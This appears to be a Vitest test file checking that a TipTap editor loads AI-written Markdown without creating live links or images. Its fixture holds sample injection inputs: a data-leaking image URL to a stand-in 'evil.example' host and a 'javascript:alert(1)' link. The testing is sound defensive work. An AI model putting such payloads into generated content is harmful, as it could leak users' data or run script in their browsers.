import { describe, expect, it } from 'vitest';
import { Editor } from '@tiptap/react';
import StarterKit from '@tiptap/starter-kit';
import { markdownToTiptapDoc, markdownToTiptapNodes } from '#/lib/markdownToTiptapDoc';

const docOf = (markdown: string) =>
  JSON.parse(markdownToTiptapDoc(markdown).contentJson) as unknown;

/*
 * The draft editor is TipTap with `StarterKit`, which in v3 includes a Link
 * extension, and the AI helper loads model-written Markdown into it (JEF-548).
 * `markdownToTiptapDoc` keeps links and images as plain text; these tests run
 * the real extensions to prove the editor does not turn that text back into a
 * live link or an image when it is loaded.
 */
const MODEL_TEXT = [
  'See [my portfolio](https://evil.example/p) and https://evil.example/bare today.',
  '',
  '![badge](https://evil.example/pixel.png?d=secret)',
  '',
  'Contact [me](javascript:alert(1)) or x@evil.example.',
].join('\n');

function makeEditor(content?: unknown): Editor {
  return new Editor({
    element: document.createElement('div'),
    extensions: [StarterKit],
    content: content as never,
  });
}

describe('the draft editor with model-written Markdown', () => {
  it('control: StarterKit does render a link when the document carries a link mark', () => {
    const editor = makeEditor({
      type: 'doc',
      content: [
        {
          type: 'paragraph',
          content: [
            {
              type: 'text',
              text: 'site',
              marks: [{ type: 'link', attrs: { href: 'https://evil.example/p' } }],
            },
          ],
        },
      ],
    });

    expect(editor.getHTML()).toContain('<a');
    editor.destroy();
  });

  it('loads links, bare URLs and images as plain text: no anchor, no img', () => {
    const editor = makeEditor(docOf(MODEL_TEXT));
    const html = editor.getHTML();

    expect(html).not.toContain('<a');
    expect(html).not.toContain('<img');
    expect(editor.getText()).toContain('https://evil.example/bare');
    editor.destroy();
  });

  it('replaces the content the same way, as "Replace" in the AI helper does', () => {
    const editor = makeEditor();
    editor.commands.setContent(
      { type: 'doc', content: markdownToTiptapNodes(MODEL_TEXT) },
      { emitUpdate: false },
    );

    expect(editor.getHTML()).not.toContain('<a');
    expect(editor.getHTML()).not.toContain('<img');
    editor.destroy();
  });

  it('inserts below existing text the same way, as "Insert below" does', () => {
    const editor = makeEditor(docOf('My own paragraph.'));
    editor.commands.insertContentAt(
      editor.state.doc.content.size,
      markdownToTiptapNodes(MODEL_TEXT),
    );

    expect(editor.getHTML()).not.toContain('<a');
    expect(editor.getHTML()).not.toContain('<img');
    editor.destroy();
  });
});
